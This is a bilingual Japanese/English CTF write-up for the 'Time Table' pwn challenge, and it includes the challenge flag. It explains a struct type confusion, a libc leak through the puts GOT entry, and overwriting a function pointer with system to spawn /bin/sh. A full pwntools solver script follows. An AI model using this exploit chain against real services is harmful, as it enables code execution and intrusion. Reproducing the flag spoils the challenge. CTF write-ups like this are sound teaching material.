---
title: "08. Time Table"
level: 4
flag: "FLAG{Do_n0t_confus3_mandatory_and_el3ctive}"
writer: "EBeb"
badge: true
---
# 08. Time Table

## 問題文

Is your timetable alright?
`nc timetable-pwn.wanictf.org 9008`

## 解法-日本語
構造体での`type confusion` 
`void register_elective_class()`では`timetable[choice.time[0]][choice.time[1]].type = MANDATORY_CLASS_CODE;` のようなtypeを更新するコードが抜けている。
そのため、`void register_mandatory_class()`で登録した構造体の`timetable`の`type`が`MANDATORY_CLASS_CODE`のままである。
`madatory_subject`と`elective_subject`の構造体は以下のようになっている。
科目登録をすれば、`madatory_subject`と`elective_subject`で同じ`Time`で行われている科目がある。それを用いて`type confusion`を起こす。

```
typedef struct {
  char *name;
  int time[2];
  char *target[4];
  char memo[32];
  char *professor;
} mandatory_subject;

typedef struct {
  char *name;
  int time[2];
  char memo[32];
  char *professor;
  int (*IsAvailable)(student *);
} elective_subject;
```

`mandatory_subject`のみ`target`の領域があるため、`mandatory_subject`の`memo`と`elective_subject`の`memo`の領域が違う。
この差と`type`の更新がないことを利用して、`elective_subject`の怪しい関数ポインターを美味しいものに書き換える。
方法はいくらでもあり得るが、そのなかでsystemに変えたら一番楽だと思ってます。

まずは、`system`のアドレスをリークさせるために`memo`から`professor`の領域を`puts`の`got`に書き換えることで`puts`関数の`libc`上のアドレスをリークさせる。
`GLIBC_2.34` であることから、`puts`と`system`のアドレスの差は`0x30170`となる。
このアドレスを用いて`int (*IsAvailable)(student *);`に`system`のアドレスを書き込む。
systemに`/bin/sh`を与えるために`IsAvailable`関数の引数である`student`の構造体を確認する。

```
typedef struct {
  char name[10];
  int studentNumber;
  int EnglishScore;
} student;
```

`name`に`/bin/sh`を入力すれば`system`は`/bin/sh`が引数として入る。
そのあと`IsAvailable`を実行すると`shell`が取れる。

## WriteUp
type confusion in a structure. 
In `void register_elective_class()`, code that updates the type like `timetable[choice.time[0]][choice.time[1]].type = MANDATORY_CLASS_CODE;` is missing. 
Therefore, the `type` of the `timetable` of the structure registered in `void register_mandatory_class()` remains `MANDATORY_CLASS_CODE`. The structures of `madatory_subject` and `elective_subject` are as follows. If you register a subject, there will be a subject that takes place at the same `Time` in `madatory_subject` and `elective_subject`. Use it to cause type confusion.

```
typedef struct {
  char *name;
  int time[2];
  char *target[4];
  char memo[32];
  char *professor;
} mandatory_subject;

typedef struct {
  char *name;
  int time[2];
  char memo[32];
  char *professor;
  int (*IsAvailable)(student *);
} elective_subject;
```

Only `mandatory_subject` has the area of target, so the area of `memo` of `mandatory_subject` and `memo` of `elective_subject` is different. Using this difference and the lack of type update, rewrite the suspicious function pointer of `elective_subject` to something delicious. There are many possible ways, but I think it would be the easiest to change it to `system`.

First, to leak the address of `system`, rewrite the area of `professor` to the got of `puts`, which leaks the address of the puts function on libc. From being `GLIBC_2.34`, the difference between the addresses of `puts` and `system` is `0x30170`. Use this address to write the address of `system` to `int (*IsAvailable)(student *);`. To give `/bin/sh` to `system`, check the structure of `student`, which is an argument of the `IsAvailable` function.

```
typedef struct {
  char name[10];
  int studentNumber;
  int EnglishScore;
} student;
```

If you enter `/bin/sh` in `name`, `system` will use `/bin/sh` as an argument. After executing `IsAvailable`, you can get a shell."


## Solver
```
    try:
        pc = connect(host, port, timeout=3)
        # pc = process("./chall")
    except:
        return 2
    pc.sendlineafter(b": ", b"/bin/sh")
    pc.sendlineafter(b": ", b"5000")
    pc.sendlineafter(b": ", b"5000")
    log.info("Register Done")
    # Type Confusion GE -> Major
    pc.sendlineafter(b">", b"1")
    pc.sendlineafter(b">", b"0")
    pc.sendlineafter(b">", b"2")
    pc.sendlineafter(b">", b"0")
    log.info("Type confusion")
    # pc.interactive()

    # Leak Libc Address
    pc.sendlineafter(b">", b"4")
    pc.sendlineafter(b">", b"WED 4")
    pc.sendline(p64(0x405020))
    pc.sendlineafter(b">", b"2")
    pc.recvuntil(b" - ")
    puts_libc = pc.recvuntil(b"\n")
    print(puts_libc)
    puts_libc = puts_libc[:-1]
    puts_libc = u64(puts_libc.ljust(8, b"\x00"))
    log.info("puts_libc: " + hex(puts_libc))
    system_libc = puts_libc - 0x30170
    log.info("system_libc: " + hex(system_libc))
    pc.sendlineafter(b">", b"1")

    # OverWrite function pointer to system
    pc.sendlineafter(b">", b"4")
    payload = p64(0) + p64(system_libc)
    pc.sendlineafter(b">", b"WED 4")
    pc.sendline(payload)
    # gdb.attach(pc)
    # pc.interactive()

    pc.sendlineafter(b">", b"2")
    pc.sendlineafter(b">", b"0")
    pc.interactive()
```
